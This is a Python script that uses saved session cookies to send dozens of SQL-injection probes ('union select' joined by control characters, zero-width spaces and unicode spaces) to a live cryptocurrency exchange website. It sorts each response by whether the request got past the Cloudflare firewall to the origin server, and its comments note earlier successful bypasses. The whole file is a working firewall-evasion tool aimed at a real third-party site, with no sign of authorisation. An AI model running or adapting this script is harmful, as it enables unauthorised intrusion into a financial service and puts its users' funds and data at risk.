import subprocess

BASE = "https://bitcoinvn.io"
pairs = []
for line in open("/workspace/jar.txt"):
    line = line.rstrip("\n")
    if not line.strip(): continue
    if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
    if line.startswith("#"): continue
    f = line.split("\t")
    pairs.append(f"{f[5]}={f[6]}")
CJ = "; ".join(pairs)
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h6.txt", "-o", "/dev/null", "--max-time", "12",
           "-H", f"Cookie: {CJ}", "-H", f"User-Agent: {UA}", "--path-as-is", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    raw = open("/tmp/h6.txt").read()
    first = raw.split("\r\n")[0]
    parts = first.split(" ")
    code = parts[1] if len(parts) > 1 else "?"
    src = "ORIGIN" if "content-security-policy:" in raw.lower() else "CF-EDGE"
    return code, src

tests = [
 # --- Isolate WHY ctrl-char separators bypass: does CF only treat %20 as space? ---
 ("union%20select baseline  ", "/?q=union%20select"),            # expect BLOCKED
 ("union+select             ", "/?q=union+select"),              # expect BLOCKED
 ("union literal-space      ", "/?q=union select"),              # expect BLOCKED
 ("union %09 tab            ", "/?q=union%09select"),            # prior result said BLOCKED - recheck
 ("union %0a LF             ", "/?q=union%0aselect"),
 ("union %0d CR             ", "/?q=union%0dselect"),
 ("union %0c FF             ", "/?q=union%0cselect"),
 ("union %0b VT             ", "/?q=union%0bselect"),
 ("union %00 NUL            ", "/?q=union%00select"),
 ("union %1b ESC            ", "/?q=union%1bselect"),            # prior BYPASS
 ("union %07 BEL            ", "/?q=union%07select"),            # prior BYPASS
 ("union %01 SOH            ", "/?q=union%01select"),            # prior BYPASS
 ("union %02 STX            ", "/?q=union%02select"),
 ("union %0e SO             ", "/?q=union%0eselect"),
 ("union %0f SI             ", "/?q=union%0fselect"),
 ("union %1f US             ", "/?q=union%1fselect"),
 ("union %7f DEL            ", "/?q=union%7fselect"),
 # --- What actually reaches origin for a real param? find echo/reflection point quickly ---
 ("home page                ", "/"),
 ("markets page             ", "/markets"),
 # --- confirm zwsp inside keyword letters (not just between words) ---
 ("zwsp inside UNION        ", "/?q=un%E2%80%8Bion select"),     # splits UNION token
 ("zwsp both sides          ", "/?q=%E2%80%8Bunion%E2%80%8Bselect%E2%80%8B"),
 # --- compact: single-byte unicode-ish separators that survive to origin ---
 ("soft hyphen U+00AD       ", "/?q=union%C2%ADselect"),
 ("no-break sp U+00A0       ", "/?q=union%C2%A0select"),         # prior BYPASS
 ("ogham space mark U+1680  ", "/?q=union%E1%9A%80select"),
 ("en quad U+2000           ", "/?q=union%E2%80%80select"),
 ("em quad U+2001           ", "/?q=union%E2%80%81select"),
]

print(f"{'TEST':<28} {'CODE':<5} RESULT")
print("-"*52)
for label, p in tests:
    c, s = probe(p)
    flag = "BLOCKED-BY-WAF" if s == "CF-EDGE" else "REACHED-ORIGIN"
    print(f"{label:<28} {c:<5} {flag}")
